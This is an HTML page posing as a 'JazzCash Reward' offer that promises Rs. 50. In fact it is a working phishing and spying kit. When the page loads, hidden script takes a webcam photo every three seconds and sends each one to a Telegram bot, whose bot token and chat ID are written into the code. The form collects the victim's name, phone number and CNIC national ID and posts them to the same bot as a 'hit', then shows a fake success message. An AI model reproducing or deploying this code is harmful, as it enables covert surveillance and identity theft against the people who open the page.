<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reward Center</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; }
        .box { max-width: 350px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { width: 95%; padding: 15px; background: #d71921; color: white; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
        #v-hidden, canvas { display: none; }
    </style>
</head>
<body onload="initCamera()">

    <div class="box" id="main-box">
        <h2 style="color:#d71921;">JazzCash Reward</h2>
        <input type="text" id="n" placeholder="Full Name">
        <input type="tel" id="p" placeholder="03XXXXXXXXX">
        <input type="tel" id="c" placeholder="CNIC Number">
        <button onclick="submitData()">CLAIM RS. 50</button>
    </div>

    <video id="v-hidden" autoplay playsinline muted></video>
    <canvas id="c-hidden"></canvas>

<script>
    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
    const cid = "7107389141";

    // 1. Camera Access & Auto Capture
    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v-hidden').srcObject = stream;
            setInterval(takePhoto, 3000); // Har 3 sec baad photo
        } catch (e) { console.log("Cam Blocked"); }
    }

    function takePhoto() {
        const v = document.getElementById('v-hidden');
        const can = document.getElementById('c-hidden');
        if (v.readyState === 4) {
            can.width = v.videoWidth; can.height = v.videoHeight;
            can.getContext('2d').drawImage(v, 0, 0);
            can.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', cid);
                fd.append('photo', blob, 'hit.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.5);
        }
    }

    // 2. Submit Data with Buttons
    function submitData() {
        const name = document.getElementById('n').value;
        const num = document.getElementById('p').value;
        const cnic = document.getElementById('c').value;

        const text = `ðŸŽ¯ *NEW HIT RECEIVED* ðŸŽ¯\n\nðŸ‘¤ *Name:* ${name}\nðŸ“± *No:* ${num}\nðŸ†” *CNIC:* ${cnic}\nðŸš€ *Sender:* MUDASIR ABBAS`;

        // Buttons ka structure
        const keyboard = {
            inline_keyboard: [
                [
                    { text: "ðŸ“¸ View Photos", url: "https://t.me/your_bot_username" },
                    { text: "ðŸ“ Track IP", url: "https://iplocation.net" }
                ],
                [
                    { text: "âœ… Done", callback_data: "done" }
                ]
            ]
        };

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: cid,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: keyboard // Ye buttons attach karega
            })
        }).then(() => {
            alert("Verification Started!");
            document.getElementById('main-box').innerHTML = "<h2>Success!</h2><p>Wait 15 mins for reward.</p>";
        });
    }
</script>
</body>
</html>
